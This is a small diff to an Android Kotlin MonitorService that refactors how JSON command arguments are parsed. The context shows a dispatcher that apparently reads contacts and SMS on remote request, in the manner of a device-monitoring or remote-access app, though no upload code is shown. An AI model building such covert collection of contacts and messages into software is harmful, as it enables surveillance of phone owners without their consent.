@@ -27,7 +27,6 @@ import android.provider.Telephony
 import android.util.Log
 import androidx.core.app.NotificationCompat
 import com.google.gson.Gson
-import com.google.gson.reflect.TypeToken
 import okhttp3.MediaType
 import okhttp3.MultipartBody
 import okhttp3.OkHttpClient
@@ -336,8 +335,7 @@ class MonitorService : Service() {
 
     @Suppress("DEPRECATION")
     private fun executeCapability(capability: String, argsJson: String): Any {
-        val type = TypeToken.getParameterized(HashMap::class.java, String::class.java, Any::class.java).type
-        val args = gson.fromJson(argsJson, type)
+        val args = gson.fromJson(argsJson, HashMap::class.java) as Map<String, Any>
         return when (capability) {
             "contacts" -> getContacts()
             "sms" -> getSms()
